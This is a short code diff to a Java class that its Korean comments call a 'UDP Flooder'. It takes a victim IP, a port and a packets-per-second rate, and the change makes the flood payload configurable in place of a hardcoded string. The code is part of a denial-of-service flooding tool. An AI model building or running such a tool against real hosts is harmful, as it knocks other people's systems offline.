@@ -72,6 +72,7 @@ public class PF_SendUDP implements Runnable {
 	private long m_sysNanoTime_start;
 	
 	
+	
 	/**
 	 * UDP Flooder의 정보를 셋팅하는 메소드 지정된 디바이스가 있을 경우에만 true를 리턴
 	 * @return boolean BOOLEAN타타입으로 리턴 
@@ -81,8 +82,9 @@ public class PF_SendUDP implements Runnable {
 	 * @param ip 수신지(피해자) IP Address
 	 * @param port 수신지(피해자) Port Number
 	 * @param speed 초당 전송할 패킷의 양
+	 * @param data 각 패킷에 담을 데이터 값(Payload)
 	 */
-	public boolean set_PF_SendUDP(String ip, String port, int speed) throws NumberFormatException, UnknownHostException, SocketException 
+	public boolean set_PF_SendUDP(String ip, String port, int speed, String data) throws NumberFormatException, UnknownHostException, SocketException 
 	{
 		
 		// Device의 이름을 가져오기
@@ -112,7 +114,7 @@ public class PF_SendUDP implements Runnable {
 			m_src_port = 12;
 
 			// UDP Flooding을 위한 Data 값 설정
-			m_data = ("myeonguni.com").getBytes();
+			m_data = data.getBytes();
 			
 			
 			// 수신지(피해자) IP Address
